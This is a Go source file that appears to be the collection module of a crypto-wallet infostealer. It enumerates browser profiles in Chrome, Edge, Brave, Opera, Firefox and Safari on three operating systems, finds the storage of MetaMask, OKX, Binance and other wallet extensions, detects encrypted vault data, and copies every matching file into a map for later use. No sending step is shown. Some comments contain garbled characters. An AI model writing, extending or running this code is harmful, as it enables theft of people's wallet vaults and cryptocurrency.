package core

import (
	"database/sql"
	"encoding/json"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/moond4rk/plist"
	_ "modernc.org/sqlite"
)

type walletSpec struct {
	key string
	id  string // Chromium extension id
	ff  string // Firefox add-on GUID (addons.mozilla.org); empty = no known Firefox GUID
	sf  string // Safari extension bundle id; empty = no known Safari bundle ID
}

// Chromium ids come from the Chrome Web Store. The Firefox guid is only set
// for wallets with a published Firefox build; MetaMask is the only one here.
// Safari bundle IDs are best-effort; vault-data heuristics are the primary
// detection mechanism (see isWalletVaultData).
var walletExts = []walletSpec{
	{key: "mask", id: "nkbihfbeogaeaoehlefnkodbefgpgknn", ff: "webextension@metamask.io"},
	{key: "mask2", id: "ejbalbakoplchlghecdalmeeeajnimhm"},
	{key: "okx", id: "pbpjkcldjiffchgbbndmhojiacbgflha", sf: "com.okex.walletExtension"},
	{key: "okx2", id: "mcohilncbfahbmgdjkbpemcciiolgcge", sf: "com.okex.walletExtension"},
	{key: "bi", id: "cadiboklkpojfamcoggejbbdjcoiljjk"},
	{key: "gate", id: "cpmkedoipcpimgecpmgpldfpohjplkpp"},
	{key: "braavos", id: "hkkpjehhcnhgefhbdcgfkeegglpjchdc"},
	{key: "bitget", id: "jiidiaalihmmhddjgbnbgdfflelocpak"},
}

type walletRoot struct {
	name string
	dir  string // Chromium: browser root dir; Firefox: profile root dir; Safari: container Library root
	path bool   // Chromium: use the "Default" profile subdir
	ff   bool   // Firefox: layouts differ 鈥?see firefoxExtDataDirs
	sf   bool   // Safari: use WebKit WebsiteData layout 鈥?see collectSafariWalletFiles
}

func walletRoots() []walletRoot {
	if runtime.GOOS == "darwin" {
		home, _ := os.UserHomeDir()
		app := filepath.Join(home, "Library", "Application Support")
		safariContainer := filepath.Join(home, "Library", "Containers", "com.apple.Safari", "Data", "Library")
		return []walletRoot{
			{name: "chrome", dir: filepath.Join(app, "Google", "Chrome"), path: true},
			{name: "edge", dir: filepath.Join(app, "Microsoft Edge"), path: true},
			{name: "brave", dir: filepath.Join(app, "BraveSoftware", "Brave-Browser"), path: true},
			{name: "opera", dir: filepath.Join(app, "com.operasoftware.Opera"), path: false},
			{name: "operagx", dir: filepath.Join(app, "com.operasoftware.OperaGX"), path: false},
			{name: "firefox", dir: filepath.Join(app, "Firefox"), ff: true},
			{name: "safari", dir: safariContainer, sf: true},
		}
	}
	if runtime.GOOS == "windows" {
		local := os.Getenv("LOCALAPPDATA")
		roaming := os.Getenv("APPDATA")
		return []walletRoot{
			{name: "chrome", dir: filepath.Join(local, "Google", "Chrome", "User Data"), path: true},
			{name: "edge", dir: filepath.Join(local, "Microsoft", "Edge", "User Data"), path: true},
			{name: "brave", dir: filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data"), path: true},
			{name: "opera", dir: filepath.Join(roaming, "Opera Software", "Opera Stable"), path: false},
			{name: "operagx", dir: filepath.Join(roaming, "Opera Software", "Opera GX Stable"), path: false},
			{name: "firefox", dir: filepath.Join(roaming, "Mozilla", "Firefox", "Profiles"), ff: true},
		}
	}
	home, _ := os.UserHomeDir()
	app := filepath.Join(home, ".config")
	return []walletRoot{
		{name: "chrome", dir: filepath.Join(app, "google-chrome"), path: true},
		{name: "brave", dir: filepath.Join(app, "BraveSoftware", "Brave-Browser"), path: true},
		{name: "firefox", dir: filepath.Join(home, ".mozilla", "firefox"), ff: true},
		// Snap / Flatpak Firefox keep their profiles outside ~/.mozilla.
		{name: "firefox-snap", dir: filepath.Join(home, "snap", "firefox", "common", ".mozilla", "firefox"), ff: true},
		{name: "firefox-flatpak", dir: filepath.Join(home, ".var", "app", "org.mozilla.firefox", ".mozilla", "firefox"), ff: true},
	}
}

func walletDir(r walletRoot, id string) string {
	base := filepath.Join(r.dir, "Local Extension Settings", id)
	if r.path {
		base = filepath.Join(r.dir, "Default", "Local Extension Settings", id)
	}
	return base
}

// chromiumProfiles returns all profile directories for a Chromium-based browser.
// Chrome, Edge, Brave etc. store profiles in "Default", "Profile 1", "Profile 2", etc.
func chromiumProfiles(dir string) []string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var profiles []string
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		name := e.Name()
		// Chromium profiles: "Default", "Profile 1", "Profile 2", ..., "Guest Profile", etc.
		if name == "Default" || strings.HasPrefix(name, "Profile ") {
			profiles = append(profiles, filepath.Join(dir, name))
		}
	}
	return profiles
}

func collectWalletFiles() (map[string][]byte, int, error) {
	files := make(map[string][]byte)
	found := 0
	for _, r := range walletRoots() {
		if r.sf {
			found += collectSafariWalletFiles(r.dir, files)
			continue
		}
		if r.ff {
			found += collectFirefoxWalletFiles(r.dir, files)
			continue
		}
		if r.path {
			// Chromium-based: scan all profiles (Default, Profile 1, 鈥?
			for _, profile := range chromiumProfiles(r.dir) {
				for _, ext := range walletExts {
					dir := filepath.Join(profile, "Local Extension Settings", ext.id)
					base := "wallets/" + r.name + "/" + filepath.Base(profile) + "/" + ext.key
					if collectWalletDir(dir, base, files) {
						found++
					}
				}
			}
		} else {
			for _, ext := range walletExts {
				if collectWalletDir(walletDir(r, ext.id), "wallets/"+r.name+"/"+ext.key, files) {
					found++
				}
			}
		}
	}
	return files, found, nil
}

// collectWalletDir walks dir and stores every file under base/<rel>.
// It reports whether dir existed and the walk finished cleanly.
func collectWalletDir(dir, base string, files map[string][]byte) bool {
	info, err := os.Stat(dir)
	if err != nil || !info.IsDir() {
		return false
	}
	err = filepath.WalkDir(dir, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		data, err := os.ReadFile(p)
		if err != nil {
			return nil
		}
		rel, err := filepath.Rel(dir, p)
		if err != nil {
			return err
		}
		files[base+"/"+filepath.ToSlash(rel)] = data
		return nil
	})
	return err == nil
}

// firefoxKeys are the wallet keys collected from Firefox. MetaMask is the only
// wallet with a published Firefox build (matched by its AMO GUID); OKX and
// Binance ship Firefox XPIs privately, and sideloaded XPIs reuse the Chromium
// id, so those ids are matched too.
var firefoxKeys = map[string]struct{}{"mask": {}, "okx": {}, "okx2": {}, "bi": {}}

// firefoxWalletIDs maps every known wallet data-dir name to its wallet key.
// Firefox keeps a wallet's data under browser-extension-data/<guid>, where guid
// is the add-on GUID.
func firefoxWalletIDs() map[string]string {
	ids := make(map[string]string, len(firefoxKeys)*2)
	for _, ext := range walletExts {
		if _, ok := firefoxKeys[ext.key]; !ok {
			continue
		}
		if ext.ff != "" {
			ids[ext.ff] = ext.key
		}
		ids[ext.id] = ext.key
	}
	return ids
}

// firefoxExtDataDirs returns every browser-extension-data directory whose
// owning profile lives at most three levels below root:
// "<profile>/browser-extension-data" (Linux/Windows) or
// "<root>/Profiles/<profile>/browser-extension-data" (macOS).
func firefoxExtDataDirs(root string) []string {
	var dirs []string
	_ = filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil || !d.IsDir() {
			return nil
		}
		if d.Name() == "browser-extension-data" {
			dirs = append(dirs, p)
			return filepath.SkipDir
		}
		rel, relErr := filepath.Rel(root, p)
		if relErr != nil {
			return nil
		}
		if rel != "." && strings.Count(rel, string(os.PathSeparator))+1 >= 3 {
			return filepath.SkipDir
		}
		return nil
	})
	return dirs
}

// collectFirefoxWalletFiles scans a Firefox profile root for the data dirs of
// every known wallet extension and stores them under
// "wallets/firefox/<profile>/<key>/<rel>". It returns the number of wallet
// data dirs (per profile) that were found.
func collectFirefoxWalletFiles(root string, files map[string][]byte) int {
	ids := firefoxWalletIDs()
	found := 0

	// Legacy layout: WebExtension data under browser-extension-data/<addon-id>.
	// This is hit by sideloaded XPIs that reuse the Chromium id, and by older
	// Firefox releases. Installed-via-AMO wallets no longer live here.
	for _, extData := range firefoxExtDataDirs(root) {
		profile := filepath.Base(filepath.Dir(extData))
		entries, err := os.ReadDir(extData)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !e.IsDir() {
				continue
			}
			key, ok := ids[e.Name()]
			if !ok {
				continue
			}
			dir := filepath.Join(extData, e.Name())
			base := "wallets/firefox/" + profile + "/" + key
			if collectWalletDir(dir, base, files) {
				found++
			}
		}
	}

	// Modern layout: wallet data lives in IndexedDB under
	// storage/default/moz-extension+++<uuid>/idb, where <uuid> is a per-install
	// UUID recorded in prefs.js (extensions.webextensions.uuids).
	for _, profile := range firefoxStorageProfiles(root) {
		uuids := firefoxPrefUUIDs(profile)
		if len(uuids) == 0 {
			continue
		}
		pname := filepath.Base(profile)
		added := make(map[string]bool)
		for extID, key := range ids {
			if added[key] {
				continue
			}
			uuid, ok := uuids[extID]
			if !ok || uuid == "" {
				continue
			}
			storeDir := filepath.Join(profile, "storage", "default", "moz-extension+++"+uuid)
			dir := storeDir
			if info, err := os.Stat(filepath.Join(storeDir, "idb")); err == nil && info.IsDir() {
				dir = filepath.Join(storeDir, "idb")
			}
			base := "wallets/firefox/" + pname + "/" + key + "/idb"
			if collectWalletDir(dir, base, files) {
				found++
				added[key] = true
			}
		}
	}
	return found
}

// firefoxStorageProfiles lists profile directories under root that carry an
// extension IndexedDB store (storage/default). Profiles live at most two
// levels below root, mirroring the depth limit of firefoxExtDataDirs.
func firefoxStorageProfiles(root string) []string {
	var dirs []string
	_ = filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil || !d.IsDir() {
			return nil
		}
		if info, ierr := os.Stat(filepath.Join(p, "storage", "default")); ierr == nil && info.IsDir() {
			dirs = append(dirs, p)
			return filepath.SkipDir
		}
		rel, relErr := filepath.Rel(root, p)
		if relErr != nil {
			return nil
		}
		if rel != "." && strings.Count(rel, string(os.PathSeparator))+1 >= 3 {
			return filepath.SkipDir
		}
		return nil
	})
	return dirs
}

// firefoxPrefUUIDs reads <profile>/prefs.js and returns the
// extensions.webextensions.uuids mapping (add-on ID -> per-install UUID).
func firefoxPrefUUIDs(profile string) map[string]string {
	raw, err := os.ReadFile(filepath.Join(profile, "prefs.js"))
	if err != nil {
		return nil
	}
	var line string
	for _, l := range strings.Split(string(raw), "\n") {
		if strings.Contains(l, "extensions.webextensions.uuids") {
			line = l
			break
		}
	}
	if line == "" {
		return nil
	}
	start := strings.Index(line, "{")
	end := strings.LastIndex(line, "}")
	if start < 0 || end <= start {
		return nil
	}
	jsonStr := strings.ReplaceAll(line[start:end+1], `\"`, `"`)
	var m map[string]string
	if err := json.Unmarshal([]byte(jsonStr), &m); err != nil {
		return nil
	}
	return m
}

// safariBundleIDs builds a set of known Safari bundle IDs for wallet extensions.
func safariBundleIDs() map[string]string {
	ids := make(map[string]string)
	for _, ext := range walletExts {
		if ext.sf != "" {
			ids[ext.sf] = ext.key
		}
	}
	return ids
}

// collectSafariWalletFiles scans Safari's WebKit WebsiteData directories for
// localstorage databases containing wallet vault data (MetaMask, OKX).
//
// Safari stores extension data in:
//
//	<container>/WebKit/WebsiteData/Default/<top-hash>/<frame-hash>/LocalStorage/localstorage.sqlite3
//	<container>/WebKit/WebsiteDataStore/<uuid>/Origins/<top-hash>/<frame-hash>/LocalStorage/localstorage.sqlite3
//
// Each origin directory has an "origin" file identifying the extension. We scan all
// localstorage databases and check for wallet vault keys (data, vault, KeyringController).
func collectSafariWalletFiles(container string, files map[string][]byte) int {
	found := 0

	// Default profile WebsiteData.
	defaultWD := filepath.Join(container, "WebKit", "WebsiteData", "Default")
	found += scanSafariWebsiteData(defaultWD, "wallets/safari/default", files)

	// Named profiles: each has its own WebsiteDataStore/<uuid>/Origins.
	websitdataStoreDir := filepath.Join(container, "WebKit", "WebsiteDataStore")
	entries, err := os.ReadDir(websitdataStoreDir)
	if err != nil {
		return found
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		originsDir := filepath.Join(websitdataStoreDir, e.Name(), "Origins")
		if info, err := os.Stat(originsDir); err != nil || !info.IsDir() {
			continue
		}
		found += scanSafariWebsiteData(originsDir, "wallets/safari/"+e.Name(), files)
	}
	return found
}

// scanSafariWebsiteData walks a WebsiteData root looking for localstorage databases
// that contain wallet vault keys. It returns the number of wallet data dirs found.
func scanSafariWebsiteData(root, base string, files map[string][]byte) int {
	topEntries, err := os.ReadDir(root)
	if err != nil {
		return 0
	}
	found := 0
	for _, top := range topEntries {
		if !top.IsDir() || top.Name() == "salt" {
			continue
		}
		topPath := filepath.Join(root, top.Name())
		frameEntries, err := os.ReadDir(topPath)
		if err != nil {
			continue
		}
		for _, frame := range frameEntries {
			if !frame.IsDir() {
				continue
			}
			framePath := filepath.Join(topPath, frame.Name())
			dbPath := filepath.Join(framePath, "LocalStorage", "localstorage.sqlite3")
			if _, err := os.Stat(dbPath); err != nil {
				continue
			}
			if !localstorageContainsWalletData(dbPath) {
				continue
			}
			// Read the origin file to identify which wallet this data belongs to.
			key := identifySafariWalletOrigin(filepath.Join(framePath, "origin"))
			if key == "" {
				key = "unknown"
			}
			walletBase := base + "/" + key
			if collectWalletDir(filepath.Join(framePath, "LocalStorage"), walletBase, files) {
				found++
			}
		}
	}
	return found
}

// localstorageContainsWalletData opens a localstorage.sqlite3 database and checks
// whether any values contain known wallet vault JSON structures.
func localstorageContainsWalletData(dbPath string) bool {
	dsn := "file:" + dbPath + "?mode=ro&immutable=1"
	db, err := sql.Open("sqlite", dsn)
	if err != nil {
		return false
	}
	defer db.Close()

	rows, err := db.Query(`SELECT value FROM ItemTable`)
	if err != nil {
		return false
	}
	defer rows.Close()

	for rows.Next() {
		var value []byte
		if err := rows.Scan(&value); err != nil {
			continue
		}
		if isWalletVaultData(value) {
			return true
		}
	}
	return false
}

// isWalletVaultData checks if a localstorage value contains wallet vault JSON.
func isWalletVaultData(data []byte) bool {
	s := string(data)
	// MetaMask stores vault data under "data" key as JSON with "KeyringController"
	if strings.Contains(s, "KeyringController") && strings.Contains(s, "vault") {
		return true
	}
	// OKX wallet stores vault data as JSON with "keyring" or "vault" fields
	if strings.Contains(s, `"keyring"`) && strings.Contains(s, `"vault"`) {
		return true
	}
	// Generic vault pattern: encrypted vault JSON with salt and iv
	if strings.Contains(s, `"vault"`) && strings.Contains(s, `"salt"`) && strings.Contains(s, `"iv"`) {
		return true
	}
	return false
}

// identifySafariWalletOrigin reads the origin file and maps it to a known wallet key.
// Safari origin files are binary WebKit SecurityOrigin serializations containing the
// origin URL (e.g., "safari-web-extension://<UUID>"). We match against known wallet
// bundle IDs embedded in the URL path, or fall back to checking the origin URL string.
func identifySafariWalletOrigin(originPath string) string {
	data, err := os.ReadFile(originPath)
	if err != nil {
		return ""
	}
	// Convert binary origin data to a searchable string.
	// The origin file contains scheme + host + port. For extensions, the host/UUID
	// may contain the bundle ID or a mapping we can match against.
	s := string(data)

	// Check for known wallet bundle IDs in the origin data.
	bundles := safariBundleIDs()
	for bundleID, key := range bundles {
		if strings.Contains(s, bundleID) {
			return key
		}
	}

	// Safari Web Extension origins may contain the extension UUID. We can't directly
	// map UUID -> bundleID without the plist, so we try to read Extensions.plist
	// from the container to build a UUID -> bundleID mapping.
	if strings.Contains(s, "safari-web-extension") {
		return tryResolveSafariExtUUID(originPath, data)
	}

	return ""
}

// tryResolveSafariExtUUID attempts to resolve a Safari Web Extension UUID from the
// origin file by checking the container's Extensions.plist for known wallet bundle IDs.
func tryResolveSafariExtUUID(originPath string, originData []byte) string {
	// The container is several levels up from the origin file:
	// <container>/WebKit/WebsiteData/Default/<hash>/<hash>/origin
	// or
	// <container>/WebKit/WebsiteDataStore/<uuid>/Origins/<hash>/<hash>/origin
	container := filepath.Dir(filepath.Dir(filepath.Dir(filepath.Dir(filepath.Dir(originPath)))))
	bundles := safariBundleIDs()

	// Try both WebExtensions and AppExtensions plists.
	for _, sub := range []string{"Safari/WebExtensions", "Safari/AppExtensions"} {
		plistPath := filepath.Join(container, sub, "Extensions.plist")
		f, err := os.Open(plistPath)
		if err != nil {
			continue
		}
		var decoded map[string]struct {
			Enabled *bool `plist:"Enabled"`
		}
		if err := plist.NewDecoder(f).Decode(&decoded); err != nil {
			f.Close()
			continue
		}
		f.Close()

		// Check if any known wallet bundle ID is installed.
		for key := range decoded {
			bundleID := key
			if idx := strings.Index(key, " "); idx > 0 {
				bundleID = key[:idx]
			}
			if walletKey, ok := bundles[bundleID]; ok {
				return walletKey
			}
		}
	}
	return ""
}
